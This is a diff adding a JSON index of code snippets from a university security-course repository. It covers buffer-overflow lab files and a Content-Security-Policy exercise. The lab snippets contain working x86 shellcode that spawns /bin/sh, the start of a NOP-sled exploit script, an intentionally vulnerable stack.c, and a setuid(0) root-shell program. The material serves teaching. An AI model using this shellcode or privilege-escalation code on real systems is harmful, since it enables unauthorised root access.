@@ -1,0 +1,91 @@
+[
+  {
+    "repo": "CIS-447",
+    "folder": "programming assg\\lab 1\\code files",
+    "code_files": [
+      "programming assg\\lab 1\\code files\\call_shellcode.c",
+      "programming assg\\lab 1\\code files\\exploit.c",
+      "programming assg\\lab 1\\code files\\exploit.py",
+      "programming assg\\lab 1\\code files\\stack.c"
+    ],
+    "snippets": [
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\code files\\call_shellcode.c",
+        "snippet": "/* call_shellcode.c  */\n\n/*A program that creates a file containing code for launching shell*/\n#include <stdlib.h>\n#include <stdio.h>\n\nconst char code[] =\n  \"\\x31\\xc0\"             /* xorl    %eax,%eax              */\n  \"\\x50\"                 /* pushl   %eax                   */\n  \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f            */\n  \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f            */\n  \"\\x89\\xe3\"             /* movl    %esp,%ebx              */\n  \"\\x50\"                 /* pushl   %eax                   */\n  \"\\x53\"                 /* pushl   %ebx                   */\n  \"\\x89\\xe1\"             /* movl    %esp,%ecx              */\n  \"\\x99\"                 /* cdq                            */\n  \"\\xb0\\x0b\"             /* movb    $0x0b,%al              */\n  \"\\xcd\\x80\"             /* int     $0x80                  */\n;"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\code files\\exploit.c",
+        "snippet": "/* exploit.c  */\n\n/* A program that creates a file containing code for launching shell*/\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nchar shellcode[]=\n    \"\\x31\\xc0\"             /* xorl    %eax,%eax              */\n    \"\\x50\"                 /* pushl   %eax                   */\n    \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f            */\n    \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f            */\n    \"\\x89\\xe3\"             /* movl    %esp,%ebx              */\n    \"\\x50\"                 /* pushl   %eax                   */\n    \"\\x53\"                 /* pushl   %ebx                   */\n    \"\\x89\\xe1\"             /* movl    %esp,%ecx              */\n    \"\\x99\"                 /* cdq                            */\n    \"\\xb0\\x0b\"             /* movb    $0x0b,%al              */\n    \"\\xcd\\x80\"             /* int     $0x80                  */\n;"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\code files\\exploit.py",
+        "snippet": "#!/usr/bin/python3\nimport sys\n\nshellcode= (\n   \"\\x31\\xc0\"    # xorl    %eax,%eax\n   \"\\x50\"        # pushl   %eax\n   \"\\x68\"\"//sh\"  # pushl   $0x68732f2f\n   \"\\x68\"\"/bin\"  # pushl   $0x6e69622f\n   \"\\x89\\xe3\"    # movl    %esp,%ebx\n   \"\\x50\"        # pushl   %eax\n   \"\\x53\"        # pushl   %ebx\n   \"\\x89\\xe1\"    # movl    %esp,%ecx\n   \"\\x99\"        # cdq\n   \"\\xb0\\x0b\"    # movb    $0x0b,%al\n   \"\\xcd\\x80\"    # int     $0x80\n).encode('latin-1')\n\n\n# Fill the content with NOP's\ncontent = bytearray(0x90 for i in range(517))"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\code files\\stack.c",
+        "snippet": "/* Vunlerable program: stack.c */\n/* You can get this program from the lab's website */\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n/* Changing this size will change the layout of the stack.\n * Instructors can change this value each year, so students\n * won't be able to use the solutions from the past.\n * Suggested value: between 0 and 400  */\n#ifndef BUF_SIZE\n#define BUF_SIZE 24\n#endif\n\nint bof(char *str)\n{\n    char buffer[BUF_SIZE];\n\n    /* The following statement has a buffer overflow problem */"
+      }
+    ]
+  },
+  {
+    "repo": "CIS-447",
+    "folder": "programming assg\\lab 1\\lab1_meech_complete",
+    "code_files": [
+      "programming assg\\lab 1\\lab1_meech_complete\\call_shellcode.c",
+      "programming assg\\lab 1\\lab1_meech_complete\\exploit.c",
+      "programming assg\\lab 1\\lab1_meech_complete\\exploit.py",
+      "programming assg\\lab 1\\lab1_meech_complete\\root_access.c",
+      "programming assg\\lab 1\\lab1_meech_complete\\stack.c"
+    ],
+    "snippets": [
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\call_shellcode.c",
+        "snippet": "/* call_shellcode.c  */\n\n/*A program that creates a file containing code for launching shell*/\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nconst char code[] =\n  \"\\x31\\xc0\"             /* xorl    %eax,%eax              */\n  \"\\x50\"                 /* pushl   %eax                   */\n  \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f            */\n  \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f            */\n  \"\\x89\\xe3\"             /* movl    %esp,%ebx              */\n  \"\\x50\"                 /* pushl   %eax                   */\n  \"\\x53\"                 /* pushl   %ebx                   */\n  \"\\x89\\xe1\"             /* movl    %esp,%ecx              */\n  \"\\x99\"                 /* cdq                            */\n  \"\\xb0\\x0b\"             /* movb    $0x0b,%al              */\n  \"\\xcd\\x80\"             /* int     $0x80                  */\n;"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\exploit.c",
+        "snippet": "/* exploit.c  */\n//modified by Demetrius Johnson  on 10/3/22 for CIS-447 UM-Dearborn with Dr. Anys Bacha\n\n/* A program that creates a file containing code for launching shell*/\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\nchar shellcode[]=\n    \"\\x31\\xc0\"             /* xorl    %eax,%eax              */\n    \"\\x50\"                 /* pushl   %eax                   */\n    \"\\x68\"\"//sh\"           /* pushl   $0x68732f2f            */\n    \"\\x68\"\"/bin\"           /* pushl   $0x6e69622f            */\n    \"\\x89\\xe3\"             /* movl    %esp,%ebx              */\n    \"\\x50\"                 /* pushl   %eax                   */\n    \"\\x53\"                 /* pushl   %ebx                   */\n    \"\\x89\\xe1\"             /* movl    %esp,%ecx              */\n    \"\\x99\"                 /* cdq                            */\n    \"\\xb0\\x0b\"             /* movb    $0x0b,%al              */\n    \"\\xcd\\x80\"             /* int     $0x80                  */\n;"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\exploit.py",
+        "snippet": "#!/usr/bin/python3\nimport sys\n\nshellcode= (\n   \"\\x31\\xc0\"    # xorl    %eax,%eax\n   \"\\x50\"        # pushl   %eax\n   \"\\x68\"\"//sh\"  # pushl   $0x68732f2f\n   \"\\x68\"\"/bin\"  # pushl   $0x6e69622f\n   \"\\x89\\xe3\"    # movl    %esp,%ebx\n   \"\\x50\"        # pushl   %eax\n   \"\\x53\"        # pushl   %ebx\n   \"\\x89\\xe1\"    # movl    %esp,%ecx\n   \"\\x99\"        # cdq\n   \"\\xb0\\x0b\"    # movb    $0x0b,%al\n   \"\\xcd\\x80\"    # int     $0x80\n).encode('latin-1')\n\n\n# Fill the content with NOP's\ncontent = bytearray(0x90 for i in range(517))"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\root_access.c",
+        "snippet": "void main()\n{\n\nsetuid(0);\nsystem (\"/bin/sh\");\n\n\n}"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 1\\lab1_meech_complete\\stack.c",
+        "snippet": "/* Vunlerable program: stack.c */\n/* You can get this program from the lab's website */\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n/* Changing this size will change the layout of the stack.\n * Instructors can change this value each year, so students\n * won't be able to use the solutions from the past.\n * Suggested value: between 0 and 400  */\n#ifndef BUF_SIZE\n#define BUF_SIZE 64\n#endif\n\nint bof(char *str)\n{\n    char buffer[BUF_SIZE];\n\n    /* The following statement has a buffer overflow problem */"
+      }
+    ]
+  },
+  {
+    "repo": "CIS-447",
+    "folder": "programming assg\\lab 3 - final exam\\csp\\csp",
+    "code_files": [
+      "programming assg\\lab 3 - final exam\\csp\\csp\\http_server.py",
+      "programming assg\\lab 3 - final exam\\csp\\csp\\script1.js",
+      "programming assg\\lab 3 - final exam\\csp\\csp\\script2.js",
+      "programming assg\\lab 3 - final exam\\csp\\csp\\script3.js"
+    ],
+    "snippets": [
+      {
+        "file": "CIS-447\\programming assg\\lab 3 - final exam\\csp\\csp\\http_server.py",
+        "snippet": "#!/usr/bin/env python3\n\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom urllib.parse import *\n\nclass MyHTTPRequestHandler(BaseHTTPRequestHandler):\n  def do_GET(self):\n    o = urlparse(self.path)\n    f = open(\".\" + o.path, 'rb') \n    self.send_response(200)\n    self.send_header('Content-Security-Policy', \n          \"default-src 'self';\"\n          \"script-src 'self' *.example68.com:8000 'nonce-1rA2345' \")     \n    self.send_header('Content-type', 'text/html')\n    self.end_headers()\n    self.wfile.write(f.read())\n    f.close()\n\nhttpd = HTTPServer(('127.0.0.1', 8000), MyHTTPRequestHandler)\nhttpd.serve_forever()"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 3 - final exam\\csp\\csp\\script1.js",
+        "snippet": "document.getElementById('area4').innerHTML = \"OK\";"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 3 - final exam\\csp\\csp\\script2.js",
+        "snippet": "document.getElementById('area5').innerHTML = \"OK\";"
+      },
+      {
+        "file": "CIS-447\\programming assg\\lab 3 - final exam\\csp\\csp\\script3.js",
+        "snippet": "document.getElementById('area6').innerHTML = \"OK\";"
+      }
+    ]
+  }
+]
